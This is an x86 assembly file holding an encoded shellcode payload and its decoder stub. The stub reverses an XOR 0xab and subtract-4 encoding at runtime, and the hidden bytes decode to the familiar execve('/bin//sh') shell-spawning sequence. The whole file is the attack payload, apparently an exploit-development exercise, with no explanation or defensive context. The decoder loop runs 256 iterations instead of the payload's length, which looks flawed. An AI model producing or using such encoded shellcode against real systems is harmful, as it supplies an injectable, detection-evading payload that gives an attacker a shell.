global _start  
  
section .text  
  
_start:
	
	xor ecx, ecx
	mul ecx					                       
	jmp short shellcode_address    		; get address of shellcode
  
decode:
	pop esi                 		; point esi to the shellcode
decoder:
	xor byte [esi], 0xab
	sub byte [esi], 4       		; decode byte stored in esi by 4
	inc al                             	; count
	jz shellcode              		; if zero " done decoding"
	inc esi  				; else: increase esi to decode next byte
	jmp short decoder  			; loop through
  
shellcode_address:  
    call decode					;push the shellcode to the stack 
    shellcode: db 0x9e,0x6f,0xff,0xc7,0x98,0x98,0xdc,0xc7,0xc7,0x98,0xcd,0xc6,0xd9,0x26,0x4c,0xff,0x26,0x4d,0xfc,0x26,0x4e,0x1f,0xa4,0x7a,0x2f
